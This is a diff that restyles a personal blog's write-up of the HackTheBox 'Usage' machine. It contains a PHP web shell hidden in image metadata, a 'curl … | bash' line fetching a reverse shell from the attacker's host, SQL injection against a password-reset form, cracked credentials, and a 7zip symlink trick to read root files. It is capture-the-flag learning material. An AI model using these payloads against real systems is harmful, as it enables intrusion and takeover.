@@ -1,1 +1,411 @@
-<html><head><meta charset="utf-8"></head><body><p>Subdomain found with ffuf</p><p><code>ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.usage.htb" -u http://usage.htb/ -fs 178</code></p><p>FUZZ: admin</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Shell as Dash</u></strong></span></p><p>&nbsp;</p><p>Running SqlMap on every request we can make the forgot password has sql injection</p><p><a href="http://usage.htb/forget-password">http://usage.htb/forget-password</a></p><p>&nbsp;</p><p>Request which is injectable</p><p><code>POST /forget-password HTTP/1.1</code><br><code>Host: usage.htb</code><br><code>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</code><br><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</code><br><code>Accept-Language: en-US,en;q=0.5</code><br><code>Accept-Encoding: gzip, deflate, br</code><br><code>Content-Type: application/x-www-form-urlencoded</code><br><code>Content-Length: 69</code><br><code>Origin: http://usage.htb</code><br><code>Connection: close</code><br><code>Referer: http://usage.htb/forget-password</code><br><code>Cookie: XSRF-TOKEN=eyJpdiI6IjRwTlI1bW9maHM5dDcyR283ZC9qNkE9PSIsInZhbHVlIjoiVHZtVU9ySTZhTHZkRElvcVYrb0w4WUxTMDh4Sm5pbEhaYWJLOWIrcE8vdGdGRnpXdldMZlZzKzM5S1h5VHhJc2VWazlwNFZ0Sk5hZFBudGtNT3ZDQVBxMDBFNnE2VWp2ejIvK0lPMDFjSzVjVDE2VCs0ZURic0pOeitjejNrVVgiLCJtYWMiOiJmNTBjNTA3Nzg4NTM0NDZmYTAzNWM4YTkwNjYzZWU2NTJlNGY3NGU2YmI1MTI4NDY1OTBiYTU2ODYxZjVhMDY5IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImJEWlpWcXhnK2IwSDlSZnpuT0Z4T3c9PSIsInZhbHVlIjoic3hmdzFHdWt2eG5JYTJyTGM1MTdONHJ2c3M3UEF6ZkVZWWZyK1JLT0l2TEduS0lYY2VuRUlIVlJRUlEvcUowNE04MkJ5Q2VEeWo5c1g5TjJ0MEUrY0NNckJoUWJud2Nvam12OXpRVWJPT0dzeFpJd1cxNG1JeitaUmZ6WHJUbkgiLCJtYWMiOiI2ZjU3N2Q3MDcyNTAzZjcyNmU4ODk2MDQ1NmQwY2ZiNjhkNjFjM2E3NzJmMGQwZjYyM2EyMDAwZGFmM2JhZWI4IiwidGFnIjoiIn0%3D</code><br><code>Upgrade-Insecure-Requests: 1</code></p><p><code>_token=W38CnQYDZ2j8EFXxws50KSBG5rN9iyS78RJzsQgL&amp;email=test%40test.com</code></p><p>&nbsp;</p><p>Looks like <a href="mailto:raj@raj.com">raj@raj.com</a> is the user we are looking for. It was dumping all users including my test account and other users test accounts as this machine was live.</p><figure class="image"><img style="aspect-ratio:1271/200;" src="../img/posts/2024-05-10-Usage(HTB)/01-f2fbc03802.png" width="1271" height="200"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Hash cracks to xander</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:738/205;" src="../img/posts/2024-05-10-Usage(HTB)/02-49c58323e7.png" width="738" height="205"></figure><p>&nbsp;</p><p>raj@raj.com:xander</p><p>&nbsp;</p><p>Administrator | &lt;blank&gt; | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin &nbsp; &nbsp;| 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |<br>&nbsp;</p><p>admin cracks to whatever1 and we can actually sign into the admin portal. For some reason it took a few attempts.</p><p>admin:whatever1</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2557/622;" src="../img/posts/2024-05-10-Usage(HTB)/03-250f42255f.png" width="2557" height="622"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>The web page allows us to update profile pictures for the admin user.</p><p>&nbsp;</p><p>I create a malicious jpg file with exiftool</p><p><code>exiftool -DocumentName="&lt;h1&gt;Testing&lt;br&gt;&lt;?php if(isset(\$_REQUEST['cmd'])){echo '&lt;pre&gt;';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '&lt;/pre&gt;';} __halt_compiler();?&gt;&lt;/h1&gt;" images.jpg</code></p><p>&nbsp;</p><p>then we upload it just like that and capture the request in burpsuite and add the .php extension to the end making it images.jpg.php</p><p>&nbsp;</p><p>The file will then upload successfully. We right click the image and click open in new tab(we have to do this very very fast as there is a script removing the uploaded pictures every 60 seconds.)</p><figure class="image"><img style="aspect-ratio:2545/674;" src="../img/posts/2024-05-10-Usage(HTB)/04-4fc0fc9085.png" width="2545" height="674"></figure><p>&nbsp;</p><p>Once we are on the new tab we add ?cmd=&lt;payload&gt; to the end of the URL to trigger a command</p><p>&nbsp;</p><p>The command below will grab a bash script and execute it with bash giving us a reverse shell</p><p>curl+http%3a//10.10.14.24%3a8000/shell.sh+|+bash</p><p>http://admin.usage.htb/uploads/images/image.jpg.php?cmd=curl+http%3a//10.10.14.24%3a8000/shell.sh+|+bash</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:654/141;" src="../img/posts/2024-05-10-Usage(HTB)/05-619514cfef.png" width="654" height="141"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>We can get the user.txt flag, however there is another use on this machine named xander</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong>Shell as Xander</strong></span></p><p>I added my RSA key so I could ssh into the machine and when doing so I saw an interesting hidden file named .monitrc in Dash's home directory. The file contains credentials for Xander. So within about 45 seconds of being on the machine I already had creds for Xander.</p><p>xander:3nc0d3d_pa$$w0rd</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:582/534;" src="../img/posts/2024-05-10-Usage(HTB)/06-5af17c6eae.png" width="582" height="534"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><br>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Privledge escalation to Root</u></strong></span></p><p>&nbsp;</p><p>&nbsp;</p><p>User xander may run the following commands on usage:<br>&nbsp; &nbsp;(ALL : ALL) NOPASSWD: /usr/bin/usage_management</p><p>&nbsp;</p><p>&nbsp;</p><p>Running this gives us 3 options</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:598/111;" src="../img/posts/2024-05-10-Usage(HTB)/07-1361fb7e65.png" width="598" height="111"></figure><p>&nbsp;</p><p>&nbsp;</p><p>The only one thats actually interesting is Project backup as it gives us output and uses 7zip</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:439/280;" src="../img/posts/2024-05-10-Usage(HTB)/08-db9604656f.png" width="439" height="280"></figure><p>&nbsp;</p><p>I looked up the version and there are some exploits for 7zip 16.02 but nothing we can really use. I found an article from hack tricks explaining symlinks and how we can use it to read files we dont have access to with 7zip. I read this and also read 0xdf explain it on a different machine.</p><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks</a></p><p><a href="https://0xdf.gitlab.io/2019/07/20/htb-ctf.html">https://0xdf.gitlab.io/2019/07/20/htb-ctf.html</a></p><p>&nbsp;</p><p>Essentially you create a symlink with a file and you link it to /root/root.txt and when 7zip tries to zip the file you create it gets an error and displays the root flag that we are unable to read.</p><p>&nbsp;</p><p>I see its accessing the folders in /var/www/html so this is where I decide to place the symlinks</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:660/104;" src="../img/posts/2024-05-10-Usage(HTB)/09-3a57118cb9.png" width="660" height="104"></figure><p>&nbsp;</p><p>Exploitation steps(i initially tried this in the project_admin directory which failed and had me stumpped for a while but I knew this had to be the correct exploit so I placed this file in all directories located in /var/www/html</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:931/236;" src="../img/posts/2024-05-10-Usage(HTB)/10-ed78d4964f.png" width="931" height="236"></figure><p>&nbsp;</p><p>We have to do this fast as well because something is removing the things we place in those directories shortly after creating them. When we run the script again it triggers the symlink, triggering the error, displaying the root flag.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1106/374;" src="../img/posts/2024-05-10-Usage(HTB)/11-32d025cd45.png" width="1106" height="374"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Really fun machine, root had me stuck for a little bit.</p><p>&nbsp;</p><p>&nbsp;</p></body></html>
+<html><head><meta charset="utf-8">
+    <title>HTB: Usage | HackWithJordan</title><style>
+        :root {
+            --bg: #0b0e14;
+            --accent: #5eead4;
+            --violet: #7c8cf8;
+            --text: #e8edf2;
+            --muted: #8b97a6;
+            --surface: rgba(255, 255, 255, .04);
+            --border: rgba(255, 255, 255, .09);
+            --accent-dim: rgba(94, 234, 212, .14);
+            --border-hover: rgba(94, 234, 212, .45);
+            --sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            --mono: 'Cascadia Code', 'JetBrains Mono', 'Fira Code', Consolas, monospace;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--sans);
+            line-height: 1.65;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        ::selection {
+            background: var(--accent-dim);
+            color: var(--accent);
+        }
+
+        #bg-canvas {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .blob {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(110px);
+            opacity: .5;
+            z-index: 0;
+            pointer-events: none;
+            will-change: transform;
+        }
+
+        .blob-1 {
+            width: 55vw;
+            height: 55vw;
+            top: -20vw;
+            left: -15vw;
+            background: radial-gradient(circle, rgba(94, 234, 212, .16), transparent 70%);
+            animation: drift1 26s ease-in-out infinite alternate;
+        }
+
+        .blob-2 {
+            width: 48vw;
+            height: 48vw;
+            bottom: -18vw;
+            right: -12vw;
+            background: radial-gradient(circle, rgba(124, 140, 248, .16), transparent 70%);
+            animation: drift2 32s ease-in-out infinite alternate;
+        }
+
+        .blob-3 {
+            width: 34vw;
+            height: 34vw;
+            top: 40%;
+            left: 55%;
+            background: radial-gradient(circle, rgba(94, 234, 212, .10), transparent 70%);
+            animation: drift3 22s ease-in-out infinite alternate;
+        }
+
+        @keyframes drift1 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(6vw, 4vw) scale(1.15); }
+        }
+
+        @keyframes drift2 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(-5vw, -6vw) scale(1.1); }
+        }
+
+        @keyframes drift3 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(-4vw, 5vw) scale(.9); }
+        }
+
+        article.post {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 96px 28px 80px;
+        }
+
+        .post-header {
+            border-bottom: 2px solid var(--violet);
+            padding-bottom: 18px;
+            margin-bottom: 36px;
+        }
+
+        .post-header h1 {
+            font-size: 2.1rem;
+            line-height: 1.2;
+            color: var(--violet);
+            font-weight: 700;
+            letter-spacing: -0.01em;
+        }
+
+        .post-header .post-meta {
+            color: var(--muted);
+            font-size: 0.95rem;
+            margin-top: 8px;
+            font-family: var(--mono);
+            letter-spacing: 0.3px;
+        }
+
+        .post h1 {
+            color: var(--violet);
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin: 44px 0 14px;
+        }
+
+        .post h2 {
+            color: var(--violet);
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin: 36px 0 12px;
+        }
+
+        .post h3 {
+            color: var(--violet);
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin: 28px 0 10px;
+        }
+
+        .post p {
+            margin: 15px 0;
+        }
+
+        .post a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .post a:hover {
+            text-decoration: underline;
+        }
+
+        .post img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+        }
+
+        .post figure {
+            margin: 20px 0;
+        }
+
+        .post pre.terminal {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: var(--mono);
+            font-size: 0.88rem;
+            line-height: 1.55;
+            margin: 18px 0;
+            color: var(--text);
+        }
+
+        .post code {
+            font-family: var(--mono);
+            font-size: 0.9em;
+            background: var(--surface);
+            padding: 2px 6px;
+            border-radius: 4px;
+            overflow-wrap: anywhere;
+        }
+
+        .post pre code {
+            background: none;
+            padding: 0;
+        }
+
+        .post ul,
+        .post ol {
+            margin: 15px 0 15px 24px;
+        }
+
+        .post li {
+            margin: 6px 0;
+        }
+
+        .post hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 32px 0;
+        }
+
+        .post table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 18px 0;
+            font-size: 0.95rem;
+        }
+
+        .post th,
+        .post td {
+            border: 1px solid var(--border);
+            padding: 8px 12px;
+            text-align: left;
+        }
+
+        .post th {
+            background: var(--surface);
+            color: var(--violet);
+        }
+
+        @media (max-width: 640px) {
+            article.post {
+                padding: 72px 20px 60px;
+            }
+
+            .post-header h1 {
+                font-size: 1.7rem;
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            .blob {
+                animation: none;
+            }
+        }
+    
+        .home-btn {
+            position: fixed;
+            top: 24px;
+            right: 28px;
+            z-index: 5;
+            font-family: var(--mono);
+            font-size: 0.85rem;
+            color: var(--muted);
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 7px 14px;
+            text-decoration: none;
+            transition: color 0.2s ease, border-color 0.2s ease;
+        }
+        .home-btn:hover {
+            color: var(--accent);
+            border-color: var(--border-hover);
+        }
+</style>
+</head><body>
+    <a class="home-btn" href="../" title="Back to home">~$ cd ~</a>
+    <canvas id="bg-canvas"></canvas>
+    <div class="blob blob-1"></div>
+    <div class="blob blob-2"></div>
+    <div class="blob blob-3"></div>
+
+    <article class="post">
+        <header class="post-header">
+            <h1>HTB: Usage</h1>
+            <div class="post-meta">May 10, 2024 &bull; HTB</div>
+        </header>
+
+<p>Subdomain found with ffuf</p><p><code>ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.usage.htb" -u http://usage.htb/ -fs 178</code></p><p>FUZZ: admin</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Shell as Dash</u></strong></span></p><p>&nbsp;</p><p>Running SqlMap on every request we can make the forgot password has sql injection</p><p><a href="http://usage.htb/forget-password">http://usage.htb/forget-password</a></p><p>&nbsp;</p><p>Request which is injectable</p><p><code>POST /forget-password HTTP/1.1</code><br><code>Host: usage.htb</code><br><code>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</code><br><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</code><br><code>Accept-Language: en-US,en;q=0.5</code><br><code>Accept-Encoding: gzip, deflate, br</code><br><code>Content-Type: application/x-www-form-urlencoded</code><br><code>Content-Length: 69</code><br><code>Origin: http://usage.htb</code><br><code>Connection: close</code><br><code>Referer: http://usage.htb/forget-password</code><br><code>Cookie: XSRF-TOKEN=eyJpdiI6IjRwTlI1bW9maHM5dDcyR283ZC9qNkE9PSIsInZhbHVlIjoiVHZtVU9ySTZhTHZkRElvcVYrb0w4WUxTMDh4Sm5pbEhaYWJLOWIrcE8vdGdGRnpXdldMZlZzKzM5S1h5VHhJc2VWazlwNFZ0Sk5hZFBudGtNT3ZDQVBxMDBFNnE2VWp2ejIvK0lPMDFjSzVjVDE2VCs0ZURic0pOeitjejNrVVgiLCJtYWMiOiJmNTBjNTA3Nzg4NTM0NDZmYTAzNWM4YTkwNjYzZWU2NTJlNGY3NGU2YmI1MTI4NDY1OTBiYTU2ODYxZjVhMDY5IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImJEWlpWcXhnK2IwSDlSZnpuT0Z4T3c9PSIsInZhbHVlIjoic3hmdzFHdWt2eG5JYTJyTGM1MTdONHJ2c3M3UEF6ZkVZWWZyK1JLT0l2TEduS0lYY2VuRUlIVlJRUlEvcUowNE04MkJ5Q2VEeWo5c1g5TjJ0MEUrY0NNckJoUWJud2Nvam12OXpRVWJPT0dzeFpJd1cxNG1JeitaUmZ6WHJUbkgiLCJtYWMiOiI2ZjU3N2Q3MDcyNTAzZjcyNmU4ODk2MDQ1NmQwY2ZiNjhkNjFjM2E3NzJmMGQwZjYyM2EyMDAwZGFmM2JhZWI4IiwidGFnIjoiIn0%3D</code><br><code>Upgrade-Insecure-Requests: 1</code></p><p><code>_token=W38CnQYDZ2j8EFXxws50KSBG5rN9iyS78RJzsQgL&amp;email=test%40test.com</code></p><p>&nbsp;</p><p>Looks like <a href="mailto:raj@raj.com">raj@raj.com</a> is the user we are looking for. It was dumping all users including my test account and other users test accounts as this machine was live.</p><figure class="image"><img style="aspect-ratio:1271/200;" src="../img/posts/2024-05-10-Usage(HTB)/01-f2fbc03802.png" width="1271" height="200"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Hash cracks to xander</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:738/205;" src="../img/posts/2024-05-10-Usage(HTB)/02-49c58323e7.png" width="738" height="205"></figure><p>&nbsp;</p><p>raj@raj.com:xander</p><p>&nbsp;</p><p>Administrator | &lt;blank&gt; | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin &nbsp; &nbsp;| 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |<br>&nbsp;</p><p>admin cracks to whatever1 and we can actually sign into the admin portal. For some reason it took a few attempts.</p><p>admin:whatever1</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2557/622;" src="../img/posts/2024-05-10-Usage(HTB)/03-250f42255f.png" width="2557" height="622"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>The web page allows us to update profile pictures for the admin user.</p><p>&nbsp;</p><p>I create a malicious jpg file with exiftool</p><p><code>exiftool -DocumentName="&lt;h1&gt;Testing&lt;br&gt;&lt;?php if(isset(\$_REQUEST['cmd'])){echo '&lt;pre&gt;';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '&lt;/pre&gt;';} __halt_compiler();?&gt;&lt;/h1&gt;" images.jpg</code></p><p>&nbsp;</p><p>then we upload it just like that and capture the request in burpsuite and add the .php extension to the end making it images.jpg.php</p><p>&nbsp;</p><p>The file will then upload successfully. We right click the image and click open in new tab(we have to do this very very fast as there is a script removing the uploaded pictures every 60 seconds.)</p><figure class="image"><img style="aspect-ratio:2545/674;" src="../img/posts/2024-05-10-Usage(HTB)/04-4fc0fc9085.png" width="2545" height="674"></figure><p>&nbsp;</p><p>Once we are on the new tab we add ?cmd=&lt;payload&gt; to the end of the URL to trigger a command</p><p>&nbsp;</p><p>The command below will grab a bash script and execute it with bash giving us a reverse shell</p><p>curl+http%3a//10.10.14.24%3a8000/shell.sh+|+bash</p><p>http://admin.usage.htb/uploads/images/image.jpg.php?cmd=curl+http%3a//10.10.14.24%3a8000/shell.sh+|+bash</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:654/141;" src="../img/posts/2024-05-10-Usage(HTB)/05-619514cfef.png" width="654" height="141"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>We can get the user.txt flag, however there is another use on this machine named xander</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong>Shell as Xander</strong></span></p><p>I added my RSA key so I could ssh into the machine and when doing so I saw an interesting hidden file named .monitrc in Dash's home directory. The file contains credentials for Xander. So within about 45 seconds of being on the machine I already had creds for Xander.</p><p>xander:3nc0d3d_pa$w0rd</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:582/534;" src="../img/posts/2024-05-10-Usage(HTB)/06-5af17c6eae.png" width="582" height="534"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><br>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Privledge escalation to Root</u></strong></span></p><p>&nbsp;</p><p>&nbsp;</p><p>User xander may run the following commands on usage:<br>&nbsp; &nbsp;(ALL : ALL) NOPASSWD: /usr/bin/usage_management</p><p>&nbsp;</p><p>&nbsp;</p><p>Running this gives us 3 options</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:598/111;" src="../img/posts/2024-05-10-Usage(HTB)/07-1361fb7e65.png" width="598" height="111"></figure><p>&nbsp;</p><p>&nbsp;</p><p>The only one thats actually interesting is Project backup as it gives us output and uses 7zip</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:439/280;" src="../img/posts/2024-05-10-Usage(HTB)/08-db9604656f.png" width="439" height="280"></figure><p>&nbsp;</p><p>I looked up the version and there are some exploits for 7zip 16.02 but nothing we can really use. I found an article from hack tricks explaining symlinks and how we can use it to read files we dont have access to with 7zip. I read this and also read 0xdf explain it on a different machine.</p><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks</a></p><p><a href="https://0xdf.gitlab.io/2019/07/20/htb-ctf.html">https://0xdf.gitlab.io/2019/07/20/htb-ctf.html</a></p><p>&nbsp;</p><p>Essentially you create a symlink with a file and you link it to /root/root.txt and when 7zip tries to zip the file you create it gets an error and displays the root flag that we are unable to read.</p><p>&nbsp;</p><p>I see its accessing the folders in /var/www/html so this is where I decide to place the symlinks</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:660/104;" src="../img/posts/2024-05-10-Usage(HTB)/09-3a57118cb9.png" width="660" height="104"></figure><p>&nbsp;</p><p>Exploitation steps(i initially tried this in the project_admin directory which failed and had me stumpped for a while but I knew this had to be the correct exploit so I placed this file in all directories located in /var/www/html</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:931/236;" src="../img/posts/2024-05-10-Usage(HTB)/10-ed78d4964f.png" width="931" height="236"></figure><p>&nbsp;</p><p>We have to do this fast as well because something is removing the things we place in those directories shortly after creating them. When we run the script again it triggers the symlink, triggering the error, displaying the root flag.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1106/374;" src="../img/posts/2024-05-10-Usage(HTB)/11-32d025cd45.png" width="1106" height="374"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Really fun machine, root had me stuck for a little bit.</p><p>&nbsp;</p><p>&nbsp;</p>
+    </article>
+
+<script>
+        // ---------- Particle background ----------
+        (function () {
+            const canvas = document.getElementById('bg-canvas');
+            const ctx = canvas.getContext('2d');
+            const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+            const mouse = { x: null, y: null };
+            let particles = [];
+            let w = 0, h = 0;
+
+            function resize() {
+                const dpr = Math.min(window.devicePixelRatio || 1, 2);
+                w = window.innerWidth;
+                h = window.innerHeight;
+                canvas.width = w * dpr;
+                canvas.height = h * dpr;
+                canvas.style.width = w + 'px';
+                canvas.style.height = h + 'px';
+                ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+                seed();
+            }
+
+            function seed() {
+                const count = Math.min(90, Math.floor((w * h) / 16000));
+                particles = [];
+                for (let i = 0; i < count; i++) {
+                    particles.push({
+                        x: Math.random() * w,
+                        y: Math.random() * h,
+                        vx: (Math.random() - 0.5) * 0.35,
+                        vy: (Math.random() - 0.5) * 0.35,
+                        r: Math.random() * 1.5 + 0.7
+                    });
+                }
+            }
+
+            function draw() {
+                ctx.clearRect(0, 0, w, h);
+
+                for (const p of particles) {
+                    p.x += p.vx;
+                    p.y += p.vy;
+
+                    if (p.x < -20) p.x = w + 20;
+                    if (p.x > w + 20) p.x = -20;
+                    if (p.y < -20) p.y = h + 20;
+                    if (p.y > h + 20) p.y = -20;
+
+                    if (mouse.x !== null) {
+                        const dx = p.x - mouse.x;
+                        const dy = p.y - mouse.y;
+                        const d = Math.hypot(dx, dy);
+                        if (d < 120 && d > 0.001) {
+                            const f = (1 - d / 120) * 0.5;
+                            p.x += (dx / d) * f;
+                            p.y += (dy / d) * f;
+                        }
+                    }
+                }
+
+                for (let i = 0; i < particles.length; i++) {
+                    const a = particles[i];
+                    for (let j = i + 1; j < particles.length; j++) {
+                        const b = particles[j];
+                        const d = Math.hypot(a.x - b.x, a.y - b.y);
+                        if (d < 110) {
+                            ctx.strokeStyle = 'rgba(94, 234, 212, ' + (0.14 * (1 - d / 110)).toFixed(3) + ')';
+                            ctx.lineWidth = 1;
+                            ctx.beginPath();
+                            ctx.moveTo(a.x, a.y);
+                            ctx.lineTo(b.x, b.y);
+                            ctx.stroke();
+                        }
+                    }
+                    if (mouse.x !== null) {
+                        const d = Math.hypot(a.x - mouse.x, a.y - mouse.y);
+                        if (d < 140) {
+                            ctx.strokeStyle = 'rgba(124, 140, 248, ' + (0.18 * (1 - d / 140)).toFixed(3) + ')';
+                            ctx.lineWidth = 1;
+                            ctx.beginPath();
+                            ctx.moveTo(a.x, a.y);
+                            ctx.lineTo(mouse.x, mouse.y);
+                            ctx.stroke();
+                        }
+                    }
+                }
+
+                for (const p of particles) {
+                    ctx.fillStyle = 'rgba(232, 237, 242, 0.5)';
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            function loop() {
+                if (!document.hidden) draw();
+                requestAnimationFrame(loop);
+            }
+
+            window.addEventListener('resize', resize);
+            window.addEventListener('mousemove', function (e) {
+                mouse.x = e.clientX;
+                mouse.y = e.clientY;
+            });
+            window.addEventListener('mouseleave', function () {
+                mouse.x = null;
+                mouse.y = null;
+            });
+
+            resize();
+            if (reduced) {
+                draw();
+            } else {
+                requestAnimationFrame(loop);
+            }
+        })();
+    </script>
+</body></html>
